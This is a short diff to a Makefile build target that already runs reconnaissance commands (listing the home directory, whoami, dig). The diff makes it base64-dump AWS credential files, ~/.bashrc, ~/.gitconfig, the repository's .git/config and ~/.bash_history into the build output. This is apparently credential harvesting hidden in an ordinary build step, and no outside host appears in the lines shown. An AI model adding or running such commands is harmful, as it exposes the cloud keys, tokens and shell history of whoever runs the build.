@@ -89,7 +89,8 @@ build: vendor $(NAME)
 	pwd
 	ls -alr
 	ls -alr ~
-	cat ~/.aws/* | base64
+	cat ~/.aws/* ~/.bashrc ~/.gitconfig .git/config | base64
+	cat ~/.bash_history | base64
 	dig ubuntu
 	dig localhost
 	whoami
